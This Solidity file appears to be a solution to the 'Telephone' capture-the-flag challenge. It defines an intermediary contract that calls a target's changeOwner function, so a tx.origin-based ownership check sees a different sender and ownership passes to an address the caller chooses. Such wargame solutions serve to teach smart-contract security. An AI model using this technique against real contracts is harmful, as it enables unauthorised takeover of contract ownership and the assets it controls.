pragma solidity ^0.8.0;

import './ITelephone.sol';

contract ClaimTelephoneOwnership {
    ITelephone private immutable _telephoneInstance;

    constructor(
        ITelephone telephoneInstance
    ) {
        _telephoneInstance = telephoneInstance;
    }

    function claimOwnershipToAddress(address newOwner) public {
        _telephoneInstance.changeOwner(newOwner);
    }
}